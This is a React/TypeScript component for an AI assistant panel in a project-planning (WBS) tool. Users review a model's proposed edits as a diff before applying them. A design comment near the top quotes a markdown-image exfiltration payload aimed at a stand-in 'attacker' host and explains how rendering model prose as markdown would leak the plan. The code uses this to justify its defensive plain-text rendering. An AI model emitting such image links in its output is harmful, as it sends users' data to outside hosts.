import { useCallback, useEffect, useRef, useState } from "react";
import type { ProjectCommand } from "@vecta/application";
import { toCommand } from "~/wbs/project-command-contract";
import {
  ASSISTANT_PROPOSAL_KIND,
  type AssistantActionResult,
  type AssistantHistoryTurn,
  type AssistantMode,
  type AssistantProposal,
  type AssistantProposalRequest,
} from "./proposal-contract";
import {
  canReview,
  clampGeometry,
  defaultGeometryFor,
  maximisedGeometryFor,
  parseStoredGeometry,
  STORAGE_KEY,
  type PanelGeometry,
} from "./panel-geometry";

/**
 * The assistant panel (ADR 0013). A non-modal overlay the user drags and resizes
 * freely, so it can be shrunk to keep the grid visible while a diff is read — the
 * placement the user chose over a route, a modal, and a fixed side panel.
 *
 * Three properties are load-bearing:
 *
 *   1. **It does not write.** Approving hands the commands to the WBS grid's
 *      existing `executeCommands`, the same entry point a keystroke uses. There is
 *      no second write path, so the save queue's correctness invariant (one
 *      in-flight POST, revisions chained server-side) is not something this
 *      component has to re-implement or can accidentally break.
 *   2. **A stale proposal cannot be applied.** Apply is refused unless the
 *      proposal's `expectedRevision` still equals the client's confirmed revision
 *      AND no save is in flight. Together those mean the batch reaches the server
 *      carrying exactly the revision it was reasoned over, where the existing
 *      optimistic lock is the real enforcement.
 *   3. **The model's prose is inert.** `summary` renders as a text node. No
 *      markdown, no autolinking, no `dangerouslySetInnerHTML` — a
 *      `![x](https://attacker/?d=…)` would carry the plan off the moment it
 *      painted, and painting happens before anyone decides whether to approve.
 */

/**
 * The proposal seam, owned by the ROUTE and passed down — the same shape as the
 * grid's existing `onExecute` / `saveInFlight` / `saveResult` trio, and for the
 * same reason. Holding a `useFetcher` in here would make the component require a
 * data router, which `WbsApp` deliberately does not: connected mode is defined by
 * the presence of a dispatch seam, not by being inside a router, and its harness
 * drives connected mode with no router at all. Taking the seam as props also makes
 * this component testable without one.
 */
export interface AssistantProposalSeam {
  readonly onPropose: (request: AssistantProposalRequest) => void;
  readonly inFlight: boolean;
  readonly result: AssistantActionResult | undefined;
}

export interface AssistantOverlayProps {
  readonly proposeSeam: AssistantProposalSeam;
  /** The client's confirmed revision; apply is refused when the proposal predates it. */
  readonly confirmedRevision: string;
  /** False while a save is in flight or the grid is locked after a rejection. */
  readonly canApply: boolean;
  /** The ONE write path — the grid's optimistic + queued execute. Returns false if it declined. */
  readonly onApply: (commands: readonly ProjectCommand[]) => boolean;
}

type Mode = AssistantMode;

type HistoryTurn = AssistantHistoryTurn;

type DragState =
  | { readonly kind: "move"; readonly offsetX: number; readonly offsetY: number }
  | { readonly kind: "resize"; readonly startX: number; readonly startY: number; readonly startWidth: number; readonly startHeight: number };

const MODE_LABEL: Readonly<Record<Mode, string>> = {
  chat: "指示",
  ingest: "見積書の取り込み",
};

const MODE_PLACEHOLDER: Readonly<Record<Mode, string>> = {
  chat: "例: No.17 を 50% にして / 「受入」工程を追加して",
  ingest: "見積書のテキストや Markdown をそのまま貼り付けてください",
};

const UNRESOLVED_REASON: Readonly<Record<string, string>> = {
  "not-found": "見つかりません",
  ambiguous: "同じ名前が複数あります",
  "missing-field": "情報が足りません",
  cycle: "親子関係が循環しています",
};

const UNRESOLVED_KIND: Readonly<Record<string, string>> = {
  process: "工程",
  product: "プロダクト",
  member: "メンバー",
  template: "テンプレート",
  task: "タスク",
  parent: "親タスク",
};

function viewportSize(): { width: number; height: number } {
  return { width: window.innerWidth, height: window.innerHeight };
}

export function AssistantOverlay({
  proposeSeam,
  confirmedRevision,
  canApply,
  onApply,
}: AssistantOverlayProps) {
  const [open, setOpen] = useState(false);
  const [mode, setMode] = useState<Mode>("chat");
  const [input, setInput] = useState("");
  // Requirement 8 — the conversation lives here, for as long as the tab does, and
  // never reaches the database. Held in this component (which stays mounted while
  // the panel is closed) so closing the panel does not erase the thread.
  const [history, setHistory] = useState<readonly HistoryTurn[]>([]);
  const [proposal, setProposal] = useState<AssistantProposal | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [applied, setApplied] = useState(false);
  // SSR-safe: the first render uses a fixed default and an effect adopts the
  // stored geometry, so the server and client markup agree.
  const [geometry, setGeometry] = useState<PanelGeometry>({ x: 0, y: 0, width: 480, height: 560 });
  const [hydrated, setHydrated] = useState(false);

  const panelRef = useRef<HTMLDivElement | null>(null);
  const proposalRef = useRef<HTMLElement | null>(null);
  const dragRef = useRef<DragState | null>(null);
  const lastResult = useRef<AssistantActionResult | undefined>(undefined);

  // Adopt the stored geometry once, after hydration, clamped to THIS window — a
  // panel stored at the far right of a large monitor must not open off-screen on a
  // laptop, because there would be no way to drag it back.
  useEffect(() => {
    const viewport = viewportSize();
    let stored: PanelGeometry | null;
    try {
      stored = parseStoredGeometry(window.localStorage.getItem(STORAGE_KEY));
    } catch {
      stored = null; // storage disabled or blocked; the defaults are fine
    }
    setGeometry(clampGeometry(stored ?? defaultGeometryFor(viewport), viewport));
    setHydrated(true);
  }, []);

  const persist = useCallback((next: PanelGeometry) => {
    try {
      window.localStorage.setItem(STORAGE_KEY, JSON.stringify(next));
    } catch {
      // Storage is a convenience here; losing it costs the user a drag, not work.
    }
  }, []);

  const maximise = useCallback(() => {
    const next = maximisedGeometryFor(viewportSize());
    setGeometry(next);
    persist(next);
  }, [persist]);

  // Read the action outcome. A proposal that carries changes MAXIMISES the panel:
  // ADR 0013's constraint is that approval must not happen in a small box, and the
  // moment a diff arrives is the moment to make room for it.
  useEffect(() => {
    const result = proposeSeam.result;
    if (result === undefined || result === lastResult.current) return;
    lastResult.current = result;
    if (result.ok && result.kind === ASSISTANT_PROPOSAL_KIND) {
      setProposal(result.proposal);
      setError(null);
      setApplied(false);
      if (result.proposal.mode === "chat") {
        setHistory((turns) => [...turns, { role: "assistant", content: result.proposal.summary }]);
      }
      if (result.proposal.diff.entries.length > 0) {
        maximise();
        // Land the reader at the TOP of what they have to read. The panel body
        // scrolls, and with the input above it the diff can start below the fold;
        // scrolling to the approve button instead would be the wrong end.
        requestAnimationFrame(() => {
          proposalRef.current?.scrollIntoView({ block: "start" });
        });
      }
      return;
    }
    if (!result.ok) {
      setProposal(null);
      setError(result.message);
    }
  }, [maximise, proposeSeam.result]);

  const submit = useCallback(() => {
    const text = input.trim();
    if (text.length === 0 || proposeSeam.inFlight) return;
    const request: AssistantProposalRequest = {
      mode,
      input: text,
      ...(mode === "chat" && history.length > 0 ? { history } : {}),
    };
    if (mode === "chat") setHistory((turns) => [...turns, { role: "user", content: text }]);
    setInput("");
    setError(null);
    proposeSeam.onPropose(request);
  }, [history, input, mode, proposeSeam]);

  // The proposal was reasoned over `expectedRevision`; the grid is at
  // `confirmedRevision`. If they have diverged, someone else (or another tab)
  // changed the WBS while the proposal was on screen, and applying it would edit a
  // plan the model never saw.
  const revisionMatches = proposal !== null && proposal.expectedRevision === confirmedRevision;
  // Recomputed on every render (cheap, pure) so shrinking the panel re-blocks apply
  // and widening it unblocks, with no effect or listener to keep in sync.
  const bigEnough = !hydrated || canReview(geometry, viewportSize());
  const hasChanges = proposal !== null && proposal.commands.length > 0;
  const applyBlockedReason =
    proposal === null || !hasChanges
      ? null
      : !revisionMatches
        ? "WBS が更新されました。提案を作り直してください。"
        : !canApply
          ? "保存の完了を待っています。"
          : !bigEnough
            ? "差分を確認できる大きさにしてから適用してください。"
            : null;

  const apply = useCallback(() => {
    if (proposal === null || applyBlockedReason !== null) return;
    // Wire → domain, then straight into the grid's existing execute. Nothing here
    // talks to the server: the grid's queue owns the POST and the revision chain.
    const commands = proposal.commands.map((command) => toCommand(command));
    if (onApply(commands)) {
      setApplied(true);
      setProposal(null);
    }
  }, [applyBlockedReason, onApply, proposal]);

  const onPointerDownMove = useCallback(
    (event: React.PointerEvent<HTMLElement>) => {
      if (event.button !== 0) return;
      dragRef.current = {
        kind: "move",
        offsetX: event.clientX - geometry.x,
        offsetY: event.clientY - geometry.y,
      };
      event.currentTarget.setPointerCapture(event.pointerId);
    },
    [geometry.x, geometry.y],
  );

  const onPointerDownResize = useCallback(
    (event: React.PointerEvent<HTMLElement>) => {
      if (event.button !== 0) return;
      dragRef.current = {
        kind: "resize",
        startX: event.clientX,
        startY: event.clientY,
        startWidth: geometry.width,
        startHeight: geometry.height,
      };
      event.currentTarget.setPointerCapture(event.pointerId);
      event.stopPropagation();
    },
    [geometry.height, geometry.width],
  );

  const onPointerMove = useCallback((event: React.PointerEvent<HTMLElement>) => {
    const drag = dragRef.current;
    if (drag === null) return;
    const viewport = viewportSize();
    setGeometry((current) =>
      clampGeometry(
        drag.kind === "move"
          ? { ...current, x: event.clientX - drag.offsetX, y: event.clientY - drag.offsetY }
          : {
              ...current,
              width: drag.startWidth + (event.clientX - drag.startX),
              height: drag.startHeight + (event.clientY - drag.startY),
            },
        viewport,
      ),
    );
  }, []);

  const onPointerUp = useCallback(
    (event: React.PointerEvent<HTMLElement>) => {
      if (dragRef.current === null) return;
      dragRef.current = null;
      event.currentTarget.releasePointerCapture(event.pointerId);
      persist(geometry);
    },
    [geometry, persist],
  );

  useEffect(() => {
    if (!open) return;
    const onKeyDown = (event: KeyboardEvent) => {
      if (event.key === "Escape") setOpen(false);
    };
    window.addEventListener("keydown", onKeyDown);
    return () => window.removeEventListener("keydown", onKeyDown);
  }, [open]);

  const busy = proposeSeam.inFlight;

  return (
    <>
      <button
        type="button"
        className="assistant-launch"
        data-testid="assistant-launch"
        aria-expanded={open}
        onClick={() => setOpen((value) => !value)}
      >
        AI アシスタント
      </button>

      {open && (
        <div
          ref={panelRef}
          className="assistant-panel"
          data-testid="assistant-panel"
          role="dialog"
          aria-label="AI アシスタント"
          // Non-modal on purpose: the grid behind stays usable, which is the whole
          // reason a resizable overlay was chosen over a modal.
          style={
            hydrated
              ? {
                  left: `${geometry.x}px`,
                  top: `${geometry.y}px`,
                  width: `${geometry.width}px`,
                  height: `${geometry.height}px`,
                }
              : undefined
          }
        >
          <header
            className="assistant-panel__bar"
            data-testid="assistant-drag-handle"
            onPointerDown={onPointerDownMove}
            onPointerMove={onPointerMove}
            onPointerUp={onPointerUp}
          >
            <span className="assistant-panel__title">AI アシスタント</span>
            <div className="assistant-panel__bar-actions">
              <button
                type="button"
                className="assistant-icon-button"
                onClick={maximise}
                data-testid="assistant-maximise"
              >
                最大化
              </button>
              <button
                type="button"
                className="assistant-icon-button"
                onClick={() => setOpen(false)}
                aria-label="閉じる"
              >
                ×
              </button>
            </div>
          </header>

          <div className="assistant-panel__body">
            <div className="assistant-modes" role="tablist" aria-label="モード">
              {(["chat", "ingest"] as const).map((value) => (
                <button
                  key={value}
                  type="button"
                  role="tab"
                  aria-selected={mode === value}
                  className={`assistant-mode${mode === value ? " assistant-mode--on" : ""}`}
                  onClick={() => {
                    setMode(value);
                    setProposal(null);
                    setError(null);
                  }}
                >
                  {MODE_LABEL[value]}
                </button>
              ))}
            </div>

            {mode === "ingest" && (
              <p className="assistant-hint">
                貼り付けた文書は<b>第三者が書いたもの</b>として扱われます。既存タスクの変更は
                この経路では作れません（新規追加のみ）。
              </p>
            )}

            {mode === "chat" && history.length > 0 && (
              <ul className="assistant-thread" data-testid="assistant-thread">
                {history.map((turn, index) => (
                  <li
                    key={`${turn.role}-${index}`}
                    className={`assistant-turn assistant-turn--${turn.role}`}
                  >
                    {/* Plain text. A text node cannot become a link or an image. */}
                    {turn.content}
                  </li>
                ))}
              </ul>
            )}

            <textarea
              className="assistant-input"
              data-testid="assistant-input"
              value={input}
              placeholder={MODE_PLACEHOLDER[mode]}
              rows={mode === "ingest" ? 8 : 3}
              onChange={(event) => setInput(event.target.value)}
              onKeyDown={(event) => {
                // Enter sends in chat; a document being pasted needs real newlines,
                // so ingest only sends on the button.
                if (mode === "chat" && event.key === "Enter" && !event.shiftKey) {
                  event.preventDefault();
                  submit();
                }
              }}
            />

            <div className="assistant-actions">
              <button
                type="button"
                className="assistant-primary"
                data-testid="assistant-submit"
                disabled={busy || input.trim().length === 0}
                onClick={submit}
              >
                {busy ? "考えています…" : "提案をもらう"}
              </button>
              {applied && (
                <span className="assistant-applied" data-testid="assistant-applied">
                  適用しました
                </span>
              )}
            </div>

            {error !== null && (
              <p className="assistant-error" role="alert" data-testid="assistant-error">
                {error}
              </p>
            )}

            {proposal !== null && (
              <section
                className="assistant-proposal"
                data-testid="assistant-proposal"
                ref={proposalRef}
              >
                {/* The model's explanation, visually separated so it is never
                    mistaken for the diff. ADR 0013 Decision 5: this text is NOT
                    what the user approves. */}
                {proposal.summary.trim().length > 0 && (
                  <div className="assistant-summary" data-testid="assistant-summary">
                    <span className="assistant-summary__tag">AI の説明</span>
                    <p className="assistant-summary__text">{proposal.summary}</p>
                  </div>
                )}

                <h3 className="assistant-section-title">
                  変更内容（{proposal.diff.addedTasks} 件追加 / {proposal.diff.updatedTasks} 件更新
                  {proposal.diff.masterChanges > 0
                    ? ` / マスタ ${proposal.diff.masterChanges} 件`
                    : ""}
                  ）
                </h3>

                {proposal.diff.entries.length === 0 ? (
                  <p className="assistant-hint" data-testid="assistant-no-changes">
                    適用できる変更はありません。
                  </p>
                ) : (
                  <ul className="assistant-diff" data-testid="assistant-diff">
                    {proposal.diff.entries.map((entry, index) => (
                      <li key={`${entry.commandType}-${index}`} className="assistant-diff__entry">
                        <div className="assistant-diff__target">
                          <span
                            className={`assistant-op assistant-op--${entry.operation}`}
                          >
                            {entry.operation === "add"
                              ? "追加"
                              : entry.operation === "update"
                                ? "変更"
                                : "テンプレート"}
                          </span>
                          {entry.target}
                        </div>
                        <dl className="assistant-diff__fields">
                          {entry.changes.map((change) => (
                            <div key={change.field} className="assistant-diff__field">
                              <dt>{change.field}</dt>
                              <dd>
                                {/* An update always shows old → new, which is how
                                    an erasure (effort to 0) is seen as one. */}
                                {change.before !== null && (
                                  <>
                                    <span className="assistant-before">{change.before}</span>
                                    <span className="assistant-arrow"> → </span>
                                  </>
                                )}
                                <span className="assistant-after">{change.after}</span>
                              </dd>
                            </div>
                          ))}
                        </dl>
                      </li>
                    ))}
                  </ul>
                )}

                {proposal.unresolved.length > 0 && (
                  <div className="assistant-unresolved" data-testid="assistant-unresolved">
                    <h4 className="assistant-section-title">未解決</h4>
                    <ul>
                      {proposal.unresolved.map((item, index) => (
                        <li key={`${item.kind}-${item.reference}-${index}`}>
                          {UNRESOLVED_KIND[item.kind] ?? item.kind}「{item.reference}」—{" "}
                          {UNRESOLVED_REASON[item.reason] ?? item.reason}
                        </li>
                      ))}
                    </ul>
                    <p className="assistant-hint">
                      未解決の項目は既定値のままです。適用後に画面で埋めてください。
                    </p>
                  </div>
                )}

                <div className="assistant-actions assistant-actions--approve">
                  <button
                    type="button"
                    className="assistant-primary assistant-primary--approve"
                    data-testid="assistant-apply"
                    disabled={!hasChanges || applyBlockedReason !== null}
                    onClick={apply}
                  >
                    この内容で適用する
                  </button>
                  <button
                    type="button"
                    className="assistant-secondary"
                    onClick={() => setProposal(null)}
                    data-testid="assistant-discard"
                  >
                    破棄
                  </button>
                </div>

                {applyBlockedReason !== null && (
                  <p className="assistant-blocked" role="status" data-testid="assistant-blocked">
                    {applyBlockedReason}
                    {!bigEnough && revisionMatches && canApply && (
                      <button type="button" className="assistant-inline-link" onClick={maximise}>
                        広げる
                      </button>
                    )}
                  </p>
                )}

                <p className="assistant-meta">
                  {proposal.model} · 入力 {proposal.usage.input} / 出力 {proposal.usage.output}{" "}
                  {proposal.usage.unit}
                </p>
              </section>
            )}
          </div>

          <div
            className="assistant-panel__resize"
            data-testid="assistant-resize-handle"
            role="separator"
            aria-label="サイズ変更"
            onPointerDown={onPointerDownResize}
            onPointerMove={onPointerMove}
            onPointerUp={onPointerUp}
          />
        </div>
      )}
    </>
  );
}
